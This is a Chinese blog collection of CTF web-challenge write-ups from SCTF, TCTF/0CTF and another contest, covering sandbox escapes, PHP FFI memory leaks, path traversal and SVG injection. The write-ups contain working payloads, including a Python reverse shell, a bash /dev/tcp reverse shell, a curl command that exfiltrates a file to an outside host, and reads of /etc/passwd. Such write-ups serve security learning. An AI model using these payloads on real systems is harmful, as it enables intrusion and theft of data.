<p><img src="/2020/08/06/2020%E5%A4%A9%E7%BF%BC%E6%9D%AFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200808111843296.png" alt="image-20200808111843296"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">java -jar CasPoc-1.0-SNAPSHOT-jar-with-dependencies.jar http://192.168.35.158:8080/cas/login  "cat /flag"</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/06/2020%E5%A4%A9%E7%BF%BC%E6%9D%AFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200808122316103.png" alt="image-20200808122316103"></p>
<p><a href="https://www.cnblogs.com/phpdragon/p/7216626.html" target="_blank" rel="noopener">参考</a></p>
]]></content>
  </entry>
  <entry>
    <title>2020SCTFWeb题目复现</title>
    <url>/2020/07/07/2020SCTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<p>SCTF几道Web题目复现</p>
<a id="more"></a>

<h1 id="0x01-CloudDisk"><a href="#0x01-CloudDisk" class="headerlink" title="0x01 CloudDisk"></a>0x01 <strong>CloudDisk</strong></h1><p><a href="https://github.com/dlau/koa-body/issues/75" target="_blank" rel="noopener">https://github.com/dlau/koa-body/issues/75</a></p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">"files"</span>:&#123;<span class="attr">"file"</span>:&#123;<span class="attr">"name"</span>:<span class="string">"aaa"</span>,<span class="attr">"path"</span>:<span class="string">"/proc/self/cwd/flag"</span>&#125;&#125;&#125;</span><br><span class="line">&#123;<span class="attr">"files"</span>:&#123;<span class="attr">"file"</span>:&#123;<span class="attr">"name"</span>:<span class="string">"aaa"</span>,<span class="attr">"path"</span>:<span class="string">"/app/flag"</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

<h1 id="0x02-pysandbox"><a href="#0x02-pysandbox" class="headerlink" title="0x02 pysandbox"></a>0x02 <strong>pysandbox</strong></h1><blockquote>
<p>W&amp;M</p>
</blockquote>
<p>利用request.args、request.method和修改static_folder</p>
<p>背景知识：</p>
<ul>
<li><p>flask目录结构</p>
<p>/app.py</p>
<p>/templates</p>
<p>​        /index.html</p>
<p>/static</p>
<p>​        /style.css</p>
<p>可以利用<code>app.static_folder=/</code>      将<code>/</code>设置为静态目录</p>
</li>
<li><p>request.method   POST</p>
</li>
<li><p>request.args   POST=/       </p>
</li>
</ul>
<p><img src="/2020/07/07/2020SCTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200708100928461.png" alt="image-20200708100928461"></p>
<p>访问/static/flag</p>
<p><img src="/2020/07/07/2020SCTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200708100958032.png" alt="image-20200708100958032"></p>
<blockquote>
<p>另一种方法</p>
</blockquote>
<p>利用app.root_path[:1]取得/</p>
<p><img src="/2020/07/07/2020SCTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200708103617752.png" alt="image-20200708103617752"></p>
<h1 id="0x02-pysandbox2"><a href="#0x02-pysandbox2" class="headerlink" title="0x02 pysandbox2"></a>0x02 <strong>pysandbox2</strong></h1><blockquote>
<p>Nepnep</p>
</blockquote>
<p>背景知识：</p>
<p>builtins模块提供对Python的所有“内置”标识符的直接访问，里面包含python的内置函数。作为一个实现细节，大多数模块都将名称 <code>__builtins__</code> 作为其全局变量的一部分提供。 <code>__builtins__</code> 的值通常是这个模块或者这个模块的值 <a href="https://docs.python.org/zh-cn/3/library/stdtypes.html#object.__dict__" target="_blank" rel="noopener"><code>__dict__</code></a> 属性。这一点在SSTI中用的比较多。</p>
<p><img src="/2020/07/07/2020SCTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200708104304296.png" alt="image-20200708104304296"></p>
<p>可以利用<code>__builtins__.__dict__[&#39;ord&#39;]=lambda args:42</code>重写ord()函数。</p>
<blockquote>
<p>lambda arguments : expression</p>
<p>lambda*args:expression</p>
</blockquote>
<img src="/2020/07/07/2020SCTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200708103125255.png" alt="image-20200708103125255" style="zoom:200%;">

<p>之后就可以绕过security的检测。</p>
<img src="/2020/07/07/2020SCTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200708104958779.png" alt="image-20200708104958779" style="zoom:200%;">

<p>然后就可以执行任意代码。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">__builtins__.ord&#x3D;lambda*args:42</span><br><span class="line"></span><br><span class="line">__import__(&quot;os&quot;).popen(&quot;curl  ip:8888&quot;)</span><br><span class="line"></span><br><span class="line">import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;ip&quot;,8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;bash&quot;,&quot;-i&quot;]);</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/07/2020SCTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200708110333343.png" alt="image-20200708110333343"></p>
<p>还有另一种方法，可以将结果回显</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">app.view_functions[&#39;security&#39;]&#x3D;lambda: __import__(&#39;os&#39;).popen(&#39;id&#39;).read()</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/07/2020SCTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200708111330602.png" alt="image-20200708111330602"></p>
<blockquote>
<p><a href="http://www.l-team.org/archives/379.html" target="_blank" rel="noopener">L-team</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests </span><br><span class="line">print(requests.post(&#39;http:&#x2F;&#x2F;39.104.90.30:10005&#39;, data&#x3D;&#123;</span><br><span class="line">	&#39;cmd&#39;:</span><br><span class="line">    &#39;Flask.__doc__&#x3D;request.form[secret[0]];&#39;</span><br><span class="line">    &#39;app.make_response&#x3D;lambda*p:Flask.__doc__;&#39;</span><br><span class="line">    &#39;app.process_response&#x3D;exec&#39;,</span><br><span class="line">    &#39;F&#39;: &quot;__import__(&#39;os&#39;).system(\&quot;bash -c &#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;my_ip&#x2F;23333 0&gt;&amp;1&#39;\&quot;)&quot; &#125;))</span><br></pre></td></tr></table></figure>

<p><a href="http://blog.ccreater.top/" target="_blank" rel="noopener">oxcccccc</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;?a&#x3D;__import__(&#39;os&#39;).system(&#39;curl+http%3a&#x2F;&#x2F;ccreater.top%3a60000&#x2F;+-d+&#96;cat+flag|base64&#96;&#39;) HTTP&#x2F;1.1</span><br><span class="line">Host: 39.104.90.30:10006</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;83.0.4103.116 Safari&#x2F;537.36</span><br><span class="line">Accept: image&#x2F;webp,image&#x2F;apng,image&#x2F;*,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Referer: http:&#x2F;&#x2F;39.104.90.30:10006&#x2F;</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9,en-US;q&#x3D;0.8,en;q&#x3D;0.7</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundaryx3B8HB5b</span><br><span class="line">Content-Length: 248</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryx3B8HB5b</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;cmd&quot;</span><br><span class="line"></span><br><span class="line">request.args.__class__.__getattr__&#x3D;request.args.__class__.__getitem__;app.config.__class__.__eq__&#x3D;eval;app.config&#x3D;&#x3D;request.args.a;</span><br><span class="line">------WebKitFormBoundaryx3B8HB5b--</span><br></pre></td></tr></table></figure>

<p><code>__getattr__</code>:</p>
<p><code>__getitem__</code>:</p>
<p><code>__eq__</code>:</p>
</blockquote>
<h1 id="0x04-bestlanguage"><a href="#0x04-bestlanguage" class="headerlink" title="0x04 bestlanguage"></a>0x04 bestlanguage</h1><p>路由：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#routes/web.php</span></span><br><span class="line"></span><br><span class="line">Route::get(<span class="string">'/'</span>,<span class="string">"IndexController@init"</span>);</span><br><span class="line">Route::post(<span class="string">'/rm'</span>,<span class="string">"IndexController@rm"</span>);</span><br><span class="line">Route::get(<span class="string">'/tmp/&#123;filename&#125;'</span>, <span class="function"><span class="keyword">function</span> <span class="params">($filename)</span> </span>&#123;</span><br><span class="line">    readfile(<span class="string">"/var/tmp/"</span>.$filename);</span><br><span class="line">&#125;)-&gt;where(<span class="string">'filename'</span>, <span class="string">'(.*)'</span>);</span><br><span class="line">Route::post(<span class="string">'/upload'</span>,<span class="string">"IndexController@upload"</span>);</span><br><span class="line">Route::get(<span class="string">'/move/log/&#123;filename&#125;'</span>, <span class="string">'IndexController@moveLog'</span>)-&gt;where(<span class="string">'filename'</span>, <span class="string">'(.*)'</span>);</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#\App\Http\Controllers\IndexController.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Http</span>\<span class="title">Controllers</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>($_SERVER[<span class="string">"REMOTE_ADDR"</span>] !== <span class="string">"127.0.0.1"</span> &amp;&amp; strpos($_SERVER[<span class="string">"REMOTE_ADDR"</span>],<span class="string">"192.168."</span>) !== <span class="number">0</span> &amp;&amp; strpos($_SERVER[<span class="string">"REMOTE_ADDR"</span>],<span class="string">"10."</span>) !== <span class="number">0</span> )  &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"admin only"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!file_exists(<span class="string">"/var/tmp/"</span>.md5($_SERVER[<span class="string">"REMOTE_ADDR"</span>])))&#123;</span><br><span class="line">            mkdir(<span class="string">"/var/tmp/"</span>.md5($_SERVER[<span class="string">"REMOTE_ADDR"</span>]));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">rm</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(strpos($_POST[<span class="string">"filename"</span>], <span class="string">'../'</span>) !== <span class="keyword">false</span>) <span class="keyword">die</span>(<span class="string">"???"</span>);</span><br><span class="line">        <span class="keyword">if</span>(file_exists(<span class="string">"/var/"</span>.$_POST[<span class="string">"filename"</span>]))&#123;</span><br><span class="line">            <span class="keyword">if</span>(is_dir(<span class="string">"/var/"</span>.$_POST[<span class="string">"filename"</span>]))&#123;</span><br><span class="line">                rmdir(<span class="string">"/var/"</span>.$_POST[<span class="string">"filename"</span>]);</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"rmdir"</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                unlink(<span class="string">"/var/"</span>.$_POST[<span class="string">"filename"</span>]);</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"unlink"</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(strpos($_POST[<span class="string">"filename"</span>], <span class="string">'../'</span>) !== <span class="keyword">false</span>) <span class="keyword">die</span>(<span class="string">"???"</span>);</span><br><span class="line">        file_put_contents(<span class="string">"/var/tmp/"</span>.md5($_SERVER[<span class="string">"REMOTE_ADDR"</span>]).<span class="string">"/"</span>.$_POST[<span class="string">"filename"</span>],base64_decode($_POST[<span class="string">"content"</span>]));</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"/var/tmp/"</span>.md5($_SERVER[<span class="string">"REMOTE_ADDR"</span>]).<span class="string">"/"</span>.$_POST[<span class="string">"filename"</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">moveLog</span><span class="params">($filename)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        $data =date(<span class="string">"Y-m-d"</span>);</span><br><span class="line">        <span class="keyword">if</span>(!file_exists(storage_path(<span class="string">"logs"</span>).<span class="string">"/"</span>.$data))&#123;</span><br><span class="line">            mkdir(storage_path(<span class="string">"logs"</span>).<span class="string">"/"</span>.$data);</span><br><span class="line">        &#125;</span><br><span class="line">        $opts = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">'http'</span>=&gt;<span class="keyword">array</span>(</span><br><span class="line">                <span class="string">'method'</span>=&gt;<span class="string">"GET"</span>,</span><br><span class="line">                <span class="string">'timeout'</span>=&gt;<span class="number">1</span>,<span class="comment">//单位秒</span></span><br><span class="line">            )</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        $content = file_get_contents(<span class="string">"http://127.0.0.1/tmp/"</span>.md5(<span class="string">'127.0.0.1'</span>).<span class="string">"/"</span>.$filename,<span class="keyword">false</span>,stream_context_create($opts));</span><br><span class="line">        file_put_contents(storage_path(<span class="string">"logs"</span>).<span class="string">"/"</span>.$data.<span class="string">"/"</span>.$filename,$content);</span><br><span class="line">        <span class="keyword">echo</span> storage_path(<span class="string">"logs"</span>).<span class="string">"/"</span>.$data.<span class="string">"/"</span>.$filename;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/07/2020SCTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200708174824735.png" alt="image-20200708174824735"></p>
<p>任意文件读取，这里需要加上index.php。否则不会成功。</p>
<p><img src="/2020/07/07/2020SCTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200708174534642.png" alt="image-20200708174534642"></p>
<h1 id="0x05-Login-Me"><a href="#0x05-Login-Me" class="headerlink" title="0x05 Login Me"></a>0x05 Login Me</h1><p><img src="/2020/07/07/2020SCTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200708211540390.png" alt="image-20200708211540390"></p>
<h1 id="0X06-Login-Me-Aagin"><a href="#0X06-Login-Me-Aagin" class="headerlink" title="0X06 Login Me Aagin"></a>0X06 Login Me Aagin</h1><p><img src="/2020/07/07/2020SCTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200708211553620.png" alt="image-20200708211553620"></p>
]]></content>
  </entry>
  <entry>
    <title>2020 TCTF0CTF Web题目复现</title>
    <url>/2020/07/01/2020TCTF0CTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<p>TCTF几道Web题目复现</p>
<a id="more"></a>

<h1 id="0x01-easyphp-amp-noteasyphp"><a href="#0x01-easyphp-amp-noteasyphp" class="headerlink" title="0x01 easyphp&amp;noteasyphp"></a>0x01 easyphp&amp;noteasyphp</h1><p>限制了disable_function和openbase_dir.</p>
<p>首先可以利用glob来列根目录</p>
<p><img src="/2020/07/01/2020TCTF0CTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200707123003919.png" alt="image-20200707123003919"></p>
<p>读不了文件，看phpinfo开了FFI扩展，参考飘零师傅和CJm00n师傅的博客，题目需要利用FFI的memcpy来泄露内存。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//php ffi捕获异常</span></span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">	$ffi = FFI::cdef(<span class="string">"int test()"</span>,);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span>(FFI\<span class="keyword">Exception</span> $ex)&#123;</span><br><span class="line">	<span class="keyword">echo</span> $ex-&gt;getMessage(),PHP_EOL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/01/2020TCTF0CTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200707144552484.png" alt="image-20200707144552484"></p>
<p>题目禁止了cdef。然后去看看FFI<a href="https://www.php.net/manual/zh/book.ffi.php" target="_blank" rel="noopener">的其他函数</a>，</p>
<p><img src="/2020/07/01/2020TCTF0CTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200707144702756.png" alt="image-20200707144702756"></p>
<ul>
<li><p>load():可以从C的头文件加载C声明。</p>
</li>
<li><p>new():创建一个C数据结构，第一个参数是数据类型，第二个参数可以确定是创建拥有（即托管）数据还是非托管数据。 托管数据与返回的FFI \ CData对象一起存在，并在通过常规PHP引用计数或GC释放对该对象的最后一个引用时释放。 当不再需要时，应通过调用FFI :: free（）释放非托管数据。若为false，即不会自动free。</p>
</li>
<li><p>memcpy():将size大小的字节从内存区域src复制到内存区域dst。</p>
</li>
<li><p>string():从内存区域创建PHP字符串。</p>
</li>
<li><p>arrayType():动态构造一个新的C数组类型，其元素类型由类型定义，维数由第二个参数指定。</p>
</li>
</ul>
<p>泄露的步骤：</p>
<ol>
<li>首先加载flag.h</li>
<li>开辟一个存放字符数组的空间，保存首元素的地址。</li>
<li>开辟一个用来存放复制内容的空间，保存首元素的空间。</li>
<li>将等2步得到的地址向前推一个大的范围，复制到第3步得到的地址中。</li>
<li>利用string将复制的内容变成字符串，打印出来。</li>
</ol>
<blockquote>
<p>cjm00n</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">import json</span><br><span class="line"></span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;pwnable.org:19261&#x2F;&quot;</span><br><span class="line">sess &#x3D; requests.Session()</span><br><span class="line"></span><br><span class="line">def exp():</span><br><span class="line"> param &#x3D; &#123;</span><br><span class="line">     &quot;rh&quot;:</span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line">try &#123;</span><br><span class="line"> $ffi&#x3D;FFI::load(&quot;&#x2F;flag.h&quot;);</span><br><span class="line"> $a &#x3D; $ffi-&gt;new(&quot;char[8]&quot;, false); </span><br><span class="line"> $leak &#x3D; FFI::new(FFI::arrayType(FFI::type(&#39;char&#39;), [102400]), false);</span><br><span class="line"> FFI::memcpy($leak, $a-0x24000, 102400);</span><br><span class="line"> $tmp &#x3D; FFI::string($leak,102400);</span><br><span class="line"> var_dump($tmp);</span><br><span class="line">&#125; catch (FFI\Exception $ex) &#123;</span><br><span class="line"> echo $ex-&gt;getMessage(), PHP_EOL;</span><br><span class="line">&#125;</span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line"> &#125;</span><br><span class="line"> resp &#x3D; sess.get(url, params&#x3D;param).text</span><br><span class="line"> print(resp)</span><br><span class="line"> open(&quot;out&quot;, &quot;w&quot;, encoding&#x3D;&quot;utf-8&quot;).write(resp)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line"> exp()</span><br></pre></td></tr></table></figure>
</blockquote>
<p><img src="/2020/07/01/2020TCTF0CTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200707144913364.png" alt="image-20200707144913364"></p>
<p>运行函数获得flag。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    $ffi=FFI::load(<span class="string">"/flag.h"</span>);</span><br><span class="line">    $a =($ffi-&gt;flag_fUn3t1on_fFi());</span><br><span class="line">    var_dump(FFI::string($a,<span class="number">50</span>));</span><br><span class="line">&#125; <span class="keyword">catch</span> (FFI\<span class="keyword">Exception</span> $ex) &#123;</span><br><span class="line">    <span class="keyword">echo</span> $ex-&gt;getMessage(), PHP_EOL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/01/2020TCTF0CTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200707152953562.png" alt="image-20200707152953562"></p>
<blockquote>
<p>nu1l</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$flag&#x3D;FFI::load(&quot;&#x2F;flag.h&quot;);$char&#x3D;$flag-&gt;new(&quot;char[0x30]&quot;,false);$char&#x3D;FFI::addr($char);FFI::free($char);$loadflag&#x3D;FFI::load(&quot;&#x2F;flag.h&quot;);print_r($char);</span><br></pre></td></tr></table></figure>
</blockquote>
<blockquote>
<p>sky</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;pwnable.org:19261&quot;</span><br><span class="line">params &#x3D; &#123;&quot;rh&quot;:</span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line">try &#123;</span><br><span class="line"> $ffi&#x3D;FFI::load(&quot;&#x2F;flag.h&quot;);</span><br><span class="line"> &#x2F;&#x2F;get flag</span><br><span class="line"> &#x2F;&#x2F;$a &#x3D; $ffi-&gt;flag_wAt3_uP_apA3H1();</span><br><span class="line"> &#x2F;&#x2F;for($i &#x3D; 0; $i &lt; 128; $i++)&#123;</span><br><span class="line">     echo $a[$i];</span><br><span class="line"> &#x2F;&#x2F;&#125;</span><br><span class="line"> $a &#x3D; $ffi-&gt;new(&quot;char[8]&quot;, false);</span><br><span class="line"> $a[0] &#x3D; &#39;f&#39;;</span><br><span class="line"> $a[1] &#x3D; &#39;l&#39;;</span><br><span class="line"> $a[2] &#x3D; &#39;a&#39;;</span><br><span class="line"> $a[3] &#x3D; &#39;g&#39;;</span><br><span class="line"> $a[4] &#x3D; &#39;f&#39;;</span><br><span class="line"> $a[5] &#x3D; &#39;l&#39;;</span><br><span class="line"> $a[6] &#x3D; &#39;a&#39;;</span><br><span class="line"> $a[7] &#x3D; &#39;g&#39;;</span><br><span class="line"> $b &#x3D; $ffi-&gt;new(&quot;char[8]&quot;, false);</span><br><span class="line"> $b[0] &#x3D; &#39;f&#39;;</span><br><span class="line"> $b[1] &#x3D; &#39;l&#39;;</span><br><span class="line"> $b[2] &#x3D; &#39;a&#39;;</span><br><span class="line"> $b[3] &#x3D; &#39;g&#39;;</span><br><span class="line"> $newa &#x3D; $ffi-&gt;cast(&quot;void*&quot;, $a);</span><br><span class="line"> var_dump($newa);</span><br><span class="line"> $newb &#x3D; $ffi-&gt;cast(&quot;void*&quot;, $b);</span><br><span class="line"> var_dump($newb);</span><br><span class="line"> </span><br><span class="line"> $addr_of_a &#x3D; FFI::new(&quot;unsigned long long&quot;);</span><br><span class="line"> FFI::memcpy($addr_of_a, FFI::addr($newa), 8);</span><br><span class="line"> var_dump($addr_of_a);</span><br><span class="line"> </span><br><span class="line"> $leak &#x3D; FFI::new(FFI::arrayType($ffi-&gt;type(&#39;char&#39;), [102400]), false);</span><br><span class="line"> FFI::memcpy($leak, $newa-0x20000, 102400);</span><br><span class="line"> $tmp &#x3D; FFI::string($leak,102400);</span><br><span class="line"> var_dump($tmp);</span><br><span class="line"></span><br><span class="line"> &#x2F;&#x2F;var_dump($leak);</span><br><span class="line"> &#x2F;&#x2F;$leak[0] &#x3D; 0xdeadbeef;</span><br><span class="line"> &#x2F;&#x2F;$leak[1] &#x3D; 0x61616161;</span><br><span class="line"> &#x2F;&#x2F;var_dump($a);</span><br><span class="line"> &#x2F;&#x2F;FFI::memcpy($newa-0x8, $leak, 128*8);</span><br><span class="line"> &#x2F;&#x2F;var_dump($a);</span><br><span class="line"> &#x2F;&#x2F;var_dump(777);</span><br><span class="line">&#125; catch (FFI\Exception $ex) &#123;</span><br><span class="line"> echo $ex-&gt;getMessage(), PHP_EOL;</span><br><span class="line">&#125;</span><br><span class="line">var_dump(1);</span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">res &#x3D; requests.get(url&#x3D;url,params&#x3D;params)</span><br><span class="line"></span><br><span class="line">print((res.text).encode(&quot;utf-8&quot;))</span><br></pre></td></tr></table></figure>

<p>非预期</p>
<p><a href="https://ctftime.org/task/12159" target="_blank" rel="noopener">https://ctftime.org/task/12159</a></p>
</blockquote>
<h1 id="0x02-Wechat-Generator"><a href="#0x02-Wechat-Generator" class="headerlink" title="0x02 Wechat Generator"></a>0x02 Wechat Generator</h1><p>有两个路由，分别时/share和/preview</p>
<p>可以输入消息，点击preview，得到预览界面。点击share，跳到一个分享图片的链接。</p>
<p><img src="/2020/07/01/2020TCTF0CTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200703234622195.png" alt="image-20200703234622195"></p>
<p><img src="/2020/07/01/2020TCTF0CTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200703234741264.png" alt="image-20200703234741264"></p>
<p>然后访问这个图片，<a href="http://pwnable.org:5000/image/tAWfUu/png" target="_blank" rel="noopener">http://pwnable.org:5000/image/tAWfUu/png</a></p>
<p>将后面的png改成htm或svg可以得到<a href="http://pwnable.org:5000/image/tAWfUu/svg" target="_blank" rel="noopener">http://pwnable.org:5000/image/tAWfUu/svg</a></p>
<p><img src="/2020/07/01/2020TCTF0CTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200703235629001.png" alt="image-20200703235629001"></p>
<p>然后在发送表情包的时候发现如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;preview HTTP&#x2F;1.1</span><br><span class="line">Host: pwnable.org:5000</span><br><span class="line">Content-Length: 46</span><br><span class="line">Accept: application&#x2F;json, text&#x2F;javascript, *&#x2F;*; q&#x3D;0.01</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;80.0.3987.149 Safari&#x2F;537.36</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded; charset&#x3D;UTF-8</span><br><span class="line">Origin: http:&#x2F;&#x2F;pwnable.org:5000</span><br><span class="line">Referer: http:&#x2F;&#x2F;pwnable.org:5000&#x2F;</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9,en-US;q&#x3D;0.8,en;q&#x3D;0.7,zh-TW;q&#x3D;0.6</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">data&#x3D;[&#123;&quot;type&quot;:0,&quot;message&quot;:&quot;Mount4in [smile]&quot;&#125;]</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/01/2020TCTF0CTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200703235518881.png" alt="image-20200703235518881"></p>
<p>之后发现可以在smile后面加上双引号闭合前面，然后利用使用 <code>xlink:href</code>读文件。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">data&#x3D;[&#123;&quot;type&quot;:0,&quot;message&quot;:&quot;[smile\&quot;&#x2F;&gt; &lt;image xlink:href&#x3D;\&quot;text:&#x2F;flag\&quot; x&#x3D;\&quot;0\&quot; y&#x3D;\&quot;0\&quot; height&#x3D;\&quot;640px\&quot; width&#x3D;\&quot;480px\&quot;&#x2F;&gt;]Love you!&quot;&#125;]</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/01/2020TCTF0CTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200702234459101.png" alt="image-20200702234459101"></p>
<p>显示Good job</p>
<p><img src="/2020/07/01/2020TCTF0CTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200702234535125.png" alt="image-20200702234535125"></p>
<blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[smile.png&quot;&#x2F;&gt;&lt;image width&#x3D;&quot;1200&quot; height&#x3D;&quot;1200&quot; href&#x3D;&quot;text:&#x2F;etc&#x2F;passwd&quot;&#x2F;&gt; &lt;image href&#x3D;&quot;x]</span><br></pre></td></tr></table></figure>

<p><a href="https://oioki.me/2020/07/0ctf-tctf-2020-quals/这种方法也可以读文件" target="_blank" rel="noopener">https://oioki.me/2020/07/0ctf-tctf-2020-quals/这种方法也可以读文件</a></p>
</blockquote>
<p>之后读/proc/self/environ,发现有过滤，双写可以绕过。</p>
